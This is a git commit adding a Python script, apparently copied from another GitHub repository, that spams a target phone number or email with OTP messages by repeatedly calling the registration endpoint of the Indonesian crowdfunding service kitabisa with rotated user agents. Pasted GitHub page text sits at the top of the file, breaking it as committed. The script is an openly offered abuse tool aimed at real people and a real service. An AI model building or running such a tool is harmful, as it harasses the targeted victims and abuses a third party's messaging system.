66e7ddb484ba8c9365d7032bcdde313e502d56a8
alexsanderleos <57847879+alexsanderleos@users.noreply.github.com>
2019-11-17 14:08:03 +0700

    Create spamwa.py

---
+++ spamwa.py
@@ -0,0 +1,74 @@
+Skip to content
+ XiuzSec / k-bisa-otp
+Code Pull requests 0 Projects 0 Wiki Security Pulse
+k-bisa-otp/kitabis.py / 
+@Maoundis Maoundis Add files via upload
+bb619d7 7 days ago
+65 lines (49 sloc)  1.81 KB
+ 
+ You're using jump to definition to discover and navigate code.
+Learn more or give us feedback
+#-*- coding: utf8 -*-
+#ya maap kodingam we berantakan :)>
+
+import requests,random,time,os,sys
+req=requests.Session()
+
+r='\033[91m'
+c='\033[96m'
+w='\033[0m'
+
+__banner__ = ('''
+  spam kita.bisa gan :V
+%s ###############################
+ # %scode : Maoundis             %s#
+ # %stype : wa/email             %s#
+ # %steam : xiuz.sec             %s#
+ ###############################%s
+    ''' % (c,w,c,w,c,w,c,w))
+
+
+class Mate_lampu():
+        def __init__(self):
+            self.ua=open('ua.txt').read().splitlines()
+            os.system('clear')
+            print(__banner__)
+            self.sok_aelu()
+
+        def sok_aelu(self):
+            type = str(input('[?] type: '))
+            if type=='wa':
+                self.tolol = 'phone_number'
+                self.goblok=str(input('[?] no wa: '))
+            elif type=='email':
+                self.tolol = 'email'
+                self.goblok=str(input('[?] email: '))
+            else:
+                Mate_lampu()
+            self.spam_kuy()
+
+        def spam_kuy(self):
+            saapa=int(input('[?] jumlh: '))
+            print('[!] delay 10 detik :V')
+            for i in range(1,saapa+1):
+                req.headers.update({'user-agent':random.choice(self.ua)});ceko = req.post('https://core.ktbs.io/v2/user/registration/temp', json = {'full_name':'Maoundis','user_id':self.goblok,'user_id_type':self.tolol})
+                if ceko.status_code == 200:
+                    print('  %s[%d] pesan: %ssuskes nyepam gan hehe :"c ' % (w,i,c))
+                else:
+                    print('  %s[%d] pesan: %s%s' % (w,i,r,ceko.json()['errors'][0]['details']['id']))
+                time.sleep(10)
+                continue
+            quit('%s[%s#%s]%s selsai ,,,,' % (r,c,r,w))
+
+
+
+
+
+
+
+# -----main -------
+
+#try:
+sys.exit(Mate_lampu())
+#except Exception as _er:
+#    quit('%serror: %s' % (r,_er))
